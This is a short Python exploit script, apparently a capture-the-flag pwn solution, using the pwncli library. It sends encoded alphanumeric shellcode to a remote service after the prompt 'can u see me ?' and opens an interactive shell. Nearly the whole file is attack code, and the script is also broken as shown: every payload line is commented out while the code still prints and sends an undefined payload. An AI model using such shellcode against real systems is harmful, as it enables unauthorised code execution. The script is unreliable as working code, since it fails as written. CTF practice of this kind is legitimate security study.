
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

#payload='Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M3e0U190Q020a0q4y4v113b4y375p0s7k1L0d7n4x3G12325M5K8L3g5L4w4B1K080n0i144u340O0O5M5O1K8N3G4H0200040L4t31090M020f144L7k0r5M5p0y3R3F19404Q403p3f7k010D8L4L3H0N010N2x0L040N000D7m0D03'
#payload='Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M0M' #error
#payload='Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3G1P3r123V2p01187l0B104P0Y0q0n0X7k2l4L0q0200004y3Q0m030C007o012Z031611334N0o020Y063z3T0m070M017K010j7o052Z00' # error
print(payload)
sla("can u see me ?\n",payload)

ia()

